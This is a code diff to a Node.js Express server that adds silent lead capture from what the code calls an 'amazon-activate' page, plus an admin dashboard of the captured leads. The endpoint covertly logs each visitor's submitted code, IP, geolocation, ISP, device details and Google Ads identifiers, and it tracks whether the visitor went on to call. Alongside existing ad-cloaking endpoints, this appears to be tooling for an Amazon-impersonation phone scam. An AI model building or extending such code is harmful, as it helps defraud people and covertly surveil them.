@@ -10,8 +10,10 @@ const PORT = process.env.PORT || 5000;
 
 // ─── Data file paths ──────────────────────────────────────────────────────────
 const SETTINGS_FILE = path.join(__dirname, 'data', 'settings.json');
-const LOGS_FILE = path.join(__dirname, 'data', 'logs.json');
-const MAX_LOG_ENTRIES = 500;
+const LOGS_FILE     = path.join(__dirname, 'data', 'logs.json');
+const LEADS_FILE    = path.join(__dirname, 'data', 'leads.json');
+const MAX_LOG_ENTRIES  = 500;
+const MAX_LEAD_ENTRIES = 500;
 
 function readSettings() {
   try { return JSON.parse(fs.readFileSync(SETTINGS_FILE, 'utf8')); } catch (e) {
@@ -32,6 +34,38 @@ function appendLog(entry) {
   logs.unshift(entry);
   if (logs.length > MAX_LOG_ENTRIES) logs = logs.slice(0, MAX_LOG_ENTRIES);
   fs.writeFileSync(LOGS_FILE, JSON.stringify(logs, null, 2));
+}
+
+// ─── Leads helpers ────────────────────────────────────────────────────────────
+function readLeads() {
+  try { return JSON.parse(fs.readFileSync(LEADS_FILE, 'utf8')); } catch (e) { return []; }
+}
+
+function appendLead(entry) {
+  var leads = readLeads();
+  leads.unshift(entry);
+  if (leads.length > MAX_LEAD_ENTRIES) leads = leads.slice(0, MAX_LEAD_ENTRIES);
+  fs.writeFileSync(LEADS_FILE, JSON.stringify(leads, null, 2));
+}
+
+function markLeadCalled(ip, code) {
+  var leads = readLeads();
+  var cutoff = Date.now() - 30 * 60 * 1000;
+  var found = false;
+  for (var i = 0; i < leads.length; i++) {
+    var l = leads[i];
+    if (l.type === 'code_submit' && l.ip === ip && new Date(l.ts).getTime() > cutoff) {
+      leads[i].called = true;
+      leads[i].calledAt = new Date().toISOString();
+      found = true;
+      break;
+    }
+  }
+  if (!found) {
+    leads.unshift({ type: 'call_click', ts: new Date().toISOString(), ip: ip, code: code || '', called: true });
+    if (leads.length > MAX_LEAD_ENTRIES) leads = leads.slice(0, MAX_LEAD_ENTRIES);
+  }
+  fs.writeFileSync(LEADS_FILE, JSON.stringify(leads, null, 2));
 }
 
 // ─── Admin password ───────────────────────────────────────────────────────────
@@ -296,6 +330,50 @@ app.post('/api/cloakify', function(req, res) {
   res.redirect(307, '/api/cloak');
 });
 
+// ─── Lead capture (public — fires silently from amazon-activate page) ─────────
+app.post('/api/track/lead', async function(req, res) {
+  res.json({ ok: true }); // respond immediately, never block the client
+  try {
+    var type   = req.body.type || 'code_submit';
+    var realIP = req.headers['x-forwarded-for']
+      ? req.headers['x-forwarded-for'].split(',')[0].trim()
+      : req.connection.remoteAddress;
+    var code = (req.body.code || '').slice(0, 20).toUpperCase();
+
+    if (type === 'call_click') {
+      markLeadCalled(realIP, code);
+      return;
+    }
+
+    var ua = req.headers['user-agent'] || req.body.ua || '';
+    var ipData;
+    try { ipData = await checkIP(realIP); } catch (e) {
+      ipData = { country: 'XX', city: '', regionName: '', isp: '' };
+    }
+
+    appendLead({
+      type:         'code_submit',
+      ts:           new Date().toISOString(),
+      ip:           realIP,
+      country:      ipData.country      || 'XX',
+      city:         ipData.city         || '',
+      region:       ipData.regionName   || '',
+      isp:          ipData.isp          || '',
+      ua:           ua.slice(0, 120),
+      code:         code,
+      screen:       (parseInt(req.body.sw) || 0) + 'x' + (parseInt(req.body.sh) || 0),
+      tz:           (req.body.tz         || '').slice(0, 50),
+      referrer:     (req.body.referrer   || '').slice(0, 200),
+      utm_source:   (req.body.utm_source   || '').slice(0, 80),
+      utm_campaign: (req.body.utm_campaign || '').slice(0, 80),
+      utm_term:     (req.body.utm_term     || '').slice(0, 80),
+      utm_content:  (req.body.utm_content  || '').slice(0, 80),
+      gclid:        (req.body.gclid        || '').slice(0, 80),
+      called:       false
+    });
+  } catch (e) { /* silently swallow — never break client experience */ }
+});
+
 // ─── Admin login ──────────────────────────────────────────────────────────────
 app.get('/admin/login', function(req, res) {
   if (req.session && req.session.adminAuth) return res.redirect('/admin');
@@ -320,8 +398,9 @@ app.get('/admin/logout', function(req, res) {
 // ─── Admin dashboard ──────────────────────────────────────────────────────────
 app.get('/admin', requireAdmin, function(req, res) {
   var settings = readSettings();
-  var logs = readLogs();
-  res.send(adminDashboardPage(settings, logs));
+  var logs     = readLogs();
+  var leads    = readLeads();
+  res.send(adminDashboardPage(settings, logs, leads));
 });
 
 // ─── Admin settings save (URLs) ───────────────────────────────────────────────
@@ -344,6 +423,12 @@ app.post('/admin/toggle', requireAdmin, function(req, res) {
 // ─── Admin clear logs ─────────────────────────────────────────────────────────
 app.post('/admin/clear-logs', requireAdmin, function(req, res) {
   fs.writeFileSync(LOGS_FILE, '[]');
+  res.redirect('/admin');
+});
+
+// ─── Admin clear leads ────────────────────────────────────────────────────────
+app.post('/admin/clear-leads', requireAdmin, function(req, res) {
+  fs.writeFileSync(LEADS_FILE, '[]');
   res.redirect('/admin');
 });
 
@@ -427,7 +512,8 @@ button:hover{background:#6d28d9}
 </html>`;
 }
 
-function adminDashboardPage(settings, logs) {
+function adminDashboardPage(settings, logs, leads) {
+  leads = Array.isArray(leads) ? leads : [];
   var now = new Date();
   var today = now.toISOString().slice(0, 10);
   var timeStr = now.toUTCString().slice(17, 25);
@@ -537,6 +623,35 @@ function adminDashboardPage(settings, logs) {
       + '<td class="ua">' + escHtml((l.ua || '').slice(0, 50)) + '</td>'
       + '<td class="' + cls + '">' + escHtml(l.decision || '') + '</td>'
       + '<td>' + reasonPill(l.reason) + '</td>'
+      + '</tr>';
+  }).join('');
+
+  // ── Leads stats ───────────────────────────────────────────────────────────
+  var submits     = leads.filter(function(l) { return l.type === 'code_submit'; });
+  var todaySubmits = submits.filter(function(l) { return l.ts && l.ts.startsWith(today); });
+  var calledLeads  = submits.filter(function(l) { return l.called; });
+  var callRate     = submits.length > 0 ? Math.round(calledLeads.length / submits.length * 100) : 0;
+
+  function adSource(l) {
+    if (l.gclid) return '<span class="rpill rpill-amber">Google Ads</span>';
+    var src = l.utm_campaign || l.utm_source || '';
+    return src ? '<span style="font-size:0.72rem;color:#a78bfa">' + escHtml(src.slice(0, 20)) + '</span>' : '—';
+  }
+
+  var leadRows = submits.slice(0, 150).map(function(l) {
+    var ts     = l.ts ? l.ts.replace('T',' ').slice(0,19) : '';
+    var device = deviceType(l.ua || '');
+    var calledBadge = l.called
+      ? '<span class="rpill rpill-green">Yes</span>'
+      : '<span class="rpill rpill-grey">No</span>';
+    return '<tr>'
+      + '<td class="mono">' + ts + '</td>'
+      + '<td class="mono">' + escHtml(l.ip || '') + '</td>'
+      + '<td>' + locationStr(l) + '</td>'
+      + '<td>' + escHtml(device) + '</td>'
+      + '<td class="mono" style="color:#c084fc;font-weight:700">' + escHtml(l.code || '') + '</td>'
+      + '<td>' + adSource(l) + '</td>'
+      + '<td>' + calledBadge + '</td>'
       + '</tr>';
   }).join('');
 
@@ -661,6 +776,9 @@ tr:hover td{background:rgba(124,58,237,0.07)}
   </div>
   <div class="hdr-right">
     <span class="hdr-time">Last updated: ${timeStr} UTC</span>
+    <form method="POST" action="/admin/clear-leads" class="inline" onsubmit="return confirm('Clear all leads?')">
+      <button type="submit" class="btn-danger btn-sm">Clear Leads</button>
+    </form>
     <form method="POST" action="/admin/clear-logs" class="inline" onsubmit="return confirm('Clear all logs?')">
       <button type="submit" class="btn-danger btn-sm">Clear Logs</button>
     </form>
@@ -778,6 +896,35 @@ tr:hover td{background:rgba(124,58,237,0.07)}
       </div>
     </div>
 
+  </div>
+
+  <!-- Leads -->
+  <div class="card" style="margin-bottom:18px">
+    <h2>Leads — Code Submissions</h2>
+    <div class="stats-row" style="margin-bottom:16px">
+      <div class="stat"><span class="num allow-num">${todaySubmits.length}</span><span class="lbl">Today</span></div>
+      <div class="stat"><span class="num total-num">${submits.length}</span><span class="lbl">All-time</span></div>
+      <div class="stat"><span class="num" style="color:#c084fc">${calledLeads.length}</span><span class="lbl">Called</span></div>
+      <div class="stat"><span class="num rate-num">${callRate}%</span><span class="lbl">Call Rate</span></div>
+    </div>
+    <div class="log-wrap">
+      <table>
+        <thead>
+          <tr>
+            <th>Time</th>
+            <th>IP</th>
+            <th>Location</th>
+            <th>Device</th>
+            <th>Code</th>
+            <th>Ad Source</th>
+            <th>Called</th>
+          </tr>
+        </thead>
+        <tbody>
+          ${leadRows || '<tr><td colspan="7" style="text-align:center;color:#444;padding:24px">No leads yet</td></tr>'}
+        </tbody>
+      </table>
+    </div>
   </div>
 
   <!-- Decision Log -->
